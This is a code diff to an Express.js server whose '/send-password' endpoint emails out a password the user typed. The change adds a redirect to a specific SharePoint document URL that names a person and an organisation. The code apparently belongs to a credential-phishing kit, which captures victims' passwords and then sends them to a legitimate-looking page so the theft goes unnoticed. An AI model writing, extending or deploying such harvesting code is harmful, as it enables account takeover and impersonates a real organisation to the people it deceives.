@@ -55,7 +55,11 @@ app.post('/send-password', async (req, res) => {
   try {
     await sendMail(`User entered password: ${password}`);
     // Respond with JSON so frontend can redirect to SharePoint
-    res.json({ success: true });
+    res.json({
+  success: true,
+  redirect: 'https://farmersedge-my.sharepoint.com/:w:/g/personal/thom_weir_farmersedge_ca/EU-EAWlqZ4RJpbQskh6diXgBwlF_oaAWM4kc68pxFUwn6A'
+});
+
   } catch (err) {
     console.error(err);
     res.status(500).json({ success: false, message: 'Error sending password.' });
